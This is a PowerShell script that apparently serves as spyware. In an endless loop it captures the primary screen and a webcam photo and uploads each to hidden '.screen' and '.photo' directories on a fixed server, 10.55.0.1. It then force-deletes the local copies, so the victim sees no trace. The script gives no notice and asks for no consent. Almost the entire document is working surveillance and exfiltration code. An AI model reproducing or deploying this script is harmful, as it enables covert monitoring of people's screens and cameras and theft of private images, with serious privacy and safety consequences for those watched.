param (
    [int]$IntervalSeconds = 60
)

Add-Type -AssemblyName System.Windows.Forms, System.Drawing

# For WIA (webcam)
$wiaManager = New-Object -ComObject WIA.DeviceManager

function Capture-Screenshot {
    param ([string]$FilePath)
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, (New-Object System.Drawing.Point(0,0)), $bounds.Size)
    $bitmap.Save($FilePath, [System.Drawing.Imaging.ImageFormat]::Png)
}

function Capture-WebcamPhoto {
    param ([string]$FilePath)
    if ($wiaManager.DeviceInfos.Count -eq 0) {
        Write-Error "No WIA devices found."
        return $false
    }

    # Select the first camera device (adjust index if multiple)
    $device = $wiaManager.DeviceInfos[1].Connect()
    $takePictureCmd = "{AF933CAC-ACAD-11D2-A093-00C04F72DC3C}"  # WIA Take Picture command ID

    # Check if command is supported
    $supportsCmd = $false
    foreach ($cmd in $device.Commands) {
        if ($cmd.CommandID -eq $takePictureCmd) {
            $supportsCmd = $true
            break
        }
    }
    if (-not $supportsCmd) {
        Write-Error "Webcam does not support Take Picture command."
        return $false
    }

    # Take picture
    $device.ExecuteCommand($takePictureCmd)
    Start-Sleep -Milliseconds 500  # Wait for image to be ready

    # Get the latest item and transfer
    $newItem = $device.Items[$device.Items.Count]
    $image = $newItem.Transfer()
    $image.SaveFile($FilePath)
    return $true
}

function Upload-File {
    param ([string]$Url, [string]$FilePath)
    $form = @{ file = Get-Item $FilePath }
    Invoke-WebRequest -Uri $Url -Method Post -Body $form
}

while ($true) {
    $timestamp = Get-Date -Format "yyyyMMdd-HHmmss"
    
    # Screenshot
    $screenFile = "screenshot-$timestamp.png"
    Capture-Screenshot -FilePath $screenFile
    Upload-File -Url "http://10.55.0.1/uploads/.screen/" -FilePath $screenFile
    Remove-Item $screenFile -Force
    
    # Webcam photo
    $photoFile = "photo-$timestamp.jpg"
    if (Capture-WebcamPhoto -FilePath $photoFile) {
        Upload-File -Url "http://10.55.0.1/uploads/.photo/" -FilePath $photoFile
        Remove-Item $photoFile -Force
    }
    
    Start-Sleep -Seconds $IntervalSeconds
}